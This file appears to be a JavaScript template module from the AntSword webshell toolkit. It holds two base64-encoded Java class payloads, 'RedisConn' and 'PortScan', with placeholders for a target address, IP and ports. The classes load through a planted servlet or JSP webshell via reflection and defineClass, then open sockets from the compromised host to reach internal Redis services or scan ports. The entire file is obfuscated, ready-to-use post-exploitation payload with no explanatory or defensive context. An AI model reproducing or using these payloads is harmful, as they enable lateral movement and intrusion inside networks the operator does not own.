//
// 其它模板
// 向插件提供
//

module.exports = (arg1, arg2, arg3, arg4, arg5) => ({
    redisconn: {
        _: 'yv66vgAAADEBYwoANgCYCQB5AJkJAHkAmggAmwkAeQCcCACdCQB5AJ4IAJ8JAHkAoAoAeQChBwCiCgALAJgIAKMIAKQIAKUIAKYIAKcIAKgLAGIAqQsAYQCqCwBiAKoLAGEAqwoAeQCsCQB5AK0KAHkArgoACwCvBwCwBwCxCgAcAJgIALIKABwAswoAGwC0CgAcALQLAGIAtQoACwC0CgB5ALYKALcAuAoAuQC6CgApALsKACkAvAcAvQoAeQC+CgApAL8IAMAKAMEAwggAwwgAxAoAKQDFCADGCgA0AMcIAMgHAMkKADQAygcAywoAzADNCgA2AM4IAM8HANAKACkA0QgA0goANADTCgDUANUIANYIANcKACkA2AoAeQDZCgAbANoKAHkA2woAVADcCgBUAN0HAN4HAN8KAEgA4AoARwDhCgBHAOIKAEcA4woA5ADlCgApAOYKAFQA5wcA6AoAKQDpCADqCgApAOsHAOwKAFQAmAoAVADtCgBUAO4KAFQA7woAVADwBwDxCgBaAPIKAFQA8woAVAD0CgAbAPUKADQA9gcA9wcA+AcA+QgA+ggA+woANAD8CAD9CAB6CgA0AP4KAP8BAAoA/wEBCAB8BwECCAEDCQC5AQQKAMwBAAoANAEFCgC5AQYKADQBBwoANgC0CAEICACJCAEJCAEKCgA0AQsHAQwBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHZW5jb2RlcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmNzAQAMcmFuZG9tUHJlZml4AQAQZGVjb2RlckNsYXNzZGF0YQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAZkZWNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMBAAxCYXNlNjRFbmNvZGUBAAhTZW5kRGF0YQEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAMY3JlYXRlU29ja2V0AQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uZXQvU29ja2V0OwEACHBhcnNlT2JqAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQAIYXNvdXRwdXQBABJCYXNlNjREZWNvZGVUb0J5dGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAKU291cmNlRmlsZQEADlJlZGlzQ29ubi5qYXZhDACDAIQMAHoAewwAfAB9AQAGYmFzZTY0DAB+AH8BAA9hbnRzd29yZENoYXJzZXQMAIAAfwEAFGFudHN3b3JkcmFuZG9tUHJlZml4DACBAH8MAJEAkgEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAMtPnwBAAN8PC0BAA9hbnRzd29yZGFyZ2FkZHIBABJhbnRzd29yZGFyZ2NvbnRleHQBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAQ0BDgwBDwEODAEQAIoMAIkAigwAggB/DACNAI4MAREBEgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwBEQETDAEUARUMARYBFwwAkwCKBwEYDAEZAQ4HARoMARsBHAwBHQEeDACHAIgBABBqYXZhL2xhbmcvU3RyaW5nDACUAJUMAIMBHwEADGphdmEudmVyc2lvbgcBIAwBIQCKAQAAAQADMS45DAEiARwBABBqYXZhLnV0aWwuQmFzZTY0DAEjASQBAApnZXRFbmNvZGVyAQAPamF2YS9sYW5nL0NsYXNzDAElASYBABBqYXZhL2xhbmcvT2JqZWN0BwEnDAEoASkMASoBKwEADmVuY29kZVRvU3RyaW5nAQACW0IMASwBLQEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMAS4BLwcBMAwBMQEyAQAGZW5jb2RlAQADDXwKDAEzAI4MAI8AkAwBNAEVDACMAIoMATUBNgwBNwE4AQAWamF2YS9pby9CdWZmZXJlZFdyaXRlcgEAGmphdmEvaW8vT3V0cHV0U3RyZWFtV3JpdGVyDACDATkMAIMBOgwBOwEODAE8AIQHAT0MAT4BPwwAgwFADAFBAIQBAB9qYXZhL25ldC9Tb2NrZXRUaW1lb3V0RXhjZXB0aW9uDAFCAUMBAAE6DAFEAUUBAA9qYXZhL25ldC9Tb2NrZXQMAUYBRwwBSAFHDAFJAUcMAUoBSwEAGmphdmEvbmV0L0luZXRTb2NrZXRBZGRyZXNzDACDAUwMAU0BTgwBTwFQDAFRAIQMAVIBUwEAE1tMamF2YS9sYW5nL09iamVjdDsBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAEACmdldFJlcXVlc3QMAVQBJgEAC2dldFJlc3BvbnNlDAFVAVYHAVcMAVgBRwwBWQFaAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MMAVsBXAwBXQFeDAFfAWAMAWEBLwEACmdldERlY29kZXIBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAExAWIBAA9vdGhlci9SZWRpc0Nvbm4BAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAFHNldENoYXJhY3RlckVuY29kaW5nAQAMZ2V0UGFyYW1ldGVyAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAljb21wYXJlVG8BAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAhnZXRCeXRlcwEABCgpW0IBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACnJlcGxhY2VBbGwBAApnZXRNZXNzYWdlAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEAGShMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBABMoTGphdmEvaW8vV3JpdGVyOylWAQAFd3JpdGUBAAVmbHVzaAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAARyZWFkAQAFKFtCKUkBAAcoW0JJSSlWAQAFY2xvc2UBAAZsZW5ndGgBAAMoKUkBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAD3NldFJldXNlQWRkcmVzcwEABChaKVYBAAxzZXRLZWVwQWxpdmUBAA1zZXRUY3BOb0RlbGF5AQALc2V0U29MaW5nZXIBAAUoWkkpVgEAFihMamF2YS9sYW5nL1N0cmluZztJKVYBAAdjb25uZWN0AQAcKExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzO0kpVgEADHNldFNvVGltZW91dAEA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',
        [arg1]: '#{newbase64::addr}',
        [arg2]: '#{newbase64::context}'
    },
    portscan: {
        _: 'yv66vgAAADEBJwoASQCECQBmAIUJAGYAhggAhwkAZgCICACJCQBmAIoIAIsJAGYAjAoAZgCNBwCOCgALAIQIAI8IAJAIAJEIAJIIAJMIAJQLAEMAlQsAQgCWCwBDAJYLAEIAlwoAZgCYCQBmAJkKAGYAmgoACwCbBwCcBwCdCgAcAIQIAJ4KABwAnwoAGwCgCgAcAKALAEMAoQoACwCgCgBmAKIKAKMApAoApQCmCgApAKcKACkAqAcAqQoAZgCqCgApAKsIAKwKACkArQcArgoALgCvCgAuALAIALEIALIKAC4AswgAtAgAtQoALgCECgAuALYKAC4AtwoALgC4CgAuALkHALoKADsArwoALgC7CgAbALwKAEkAvQoARwC+BwC/BwDABwDBCADCCgBHAMMIAMQHAMUKAEcAxgcAxwoAyADJCADKCABnCgBHAMsKAMwAzQoAzADOCABpBwDPCADQBwDRCQClANIKAMgAzQoARwDTCgClANQKAEcA1QoA1gDXCgBJAKAIANgKANkA2ggA2woAKQDcCADdCADeCgBHAN8IAHYIAOAIAOEKAEcA4gcA4wEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAxyYW5kb21QcmVmaXgBABBkZWNvZGVyQ2xhc3NkYXRhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABmRlY29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEABFNjYW4BADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADGNyZWF0ZVNvY2tldAEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmV0L1NvY2tldDsBAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBAA1Qb3J0U2Nhbi5qYXZhDABwAHEMAGcAaAwAaQBqAQAGYmFzZTY0DABrAGwBAA9hbnRzd29yZENoYXJzZXQMAG0AbAEAFGFudHN3b3JkcmFuZG9tUHJlZml4DABuAGwMAH0AfgEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAMtPnwBAAN8PC0BAA1hbnRzd29yZGFyZ2lwAQAQYW50c3dvcmRhcmdwb3J0cwEAEmFudHN3b3JkYXJnZGVjb2RlcgEACXRleHQvaHRtbAwA5ADlDADmAOUMAOcAdwwAdgB3DABvAGwMAHkAegwA6ADpAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAJRVJST1I6Ly8gDADoAOoMAOsA7AwA7QDuDAB/AHcHAO8MAPAA5QcA8QwA8gDzDAD0APUMAHQAdQEAEGphdmEvbGFuZy9TdHJpbmcMAIAAgQwAcAD2AQABLAwA9wD4AQAPamF2YS9uZXQvU29ja2V0DABwAPkMAPoA+wEAAQkBAAYJT3BlbgoMAPwAcQEACAlDbG9zZWQKAQABOgwA/QD+DAD/AP4MAQAA/gwBAQECAQAaamF2YS9uZXQvSW5ldFNvY2tldEFkZHJlc3MMAQMBBAwBBQBxDAEGAQcMAQgBCQEAE1tMamF2YS9sYW5nL09iamVjdDsBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAwBCgELAQAKZ2V0UmVxdWVzdAEAD2phdmEvbGFuZy9DbGFzcwwBDAENAQAQamF2YS9sYW5nL09iamVjdAcBDgwBDwEQAQALZ2V0UmVzcG9uc2UMAREBEgcBEwwBFAD+DAEVARYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAAltCDAEXARgMARkBGgwBGwEcDAEdAR4HAR8MASABIQEADGphdmEudmVyc2lvbgcBIgwBIwB3AQADMS45DAEkAPMBABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgwBJQENAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBIAEmAQAOb3RoZXIvUG9ydFNjYW4BAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAFHNldENoYXJhY3RlckVuY29kaW5nAQAMZ2V0UGFyYW1ldGVyAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAFihMamF2YS9sYW5nL1N0cmluZztJKVYBAAxzZXRTb1RpbWVvdXQBAAQoSSlWAQAFY2xvc2UBAA9zZXRSZXVzZUFkZHJlc3MBAAQoWilWAQAMc2V0S2VlcEFsaXZlAQANc2V0VGNwTm9EZWxheQEAC3NldFNvTGluZ2VyAQAFKFpJKVYBAAdjb25uZWN0AQAcKExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzO0kpVgEAD3ByaW50U3RhY2tUcmFjZQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAB2lzQXJyYXkBAAMoKVoBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAOZ2V0Q29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEAC25ld0luc3RhbmNlAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAJY29tcGFyZVRvAQAJZ2V0TWV0aG9kAQAUKClMamF2YS9sYW5nL09iamVjdDsAIQBmAEkAAAAGAAEAZwBoAAAAAQBpAGoAAAABAGsAbAAAAAEAbQBsAAAAAQBuAGwAAAABAG8AbAAAAAgAAQBwAHEAAQByAAAATQACAAEAAAAhKrcAASoBtQACKgG1AAMqEgS1AAUqEga1AAcqEgi1AAmxAAAAAQBzAAAAGgAGAAAACQAEAAoACQALAA4ADAAUAA0AGgAOAAEAdAB1AAEAcgAAAVEABAAKAAAA2SortgAKuwALWbcADE0SDU4SDjoEEg86BRIQOgYSEToHKrQAAxISuQATAgAqtAACKrQAB7kAFAIAKrQAAyq0AAe5ABUCACoq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',
        [arg1]: '#{newbase64::ip}',
        [arg2]: '#{newbase64::ports}'
    },
})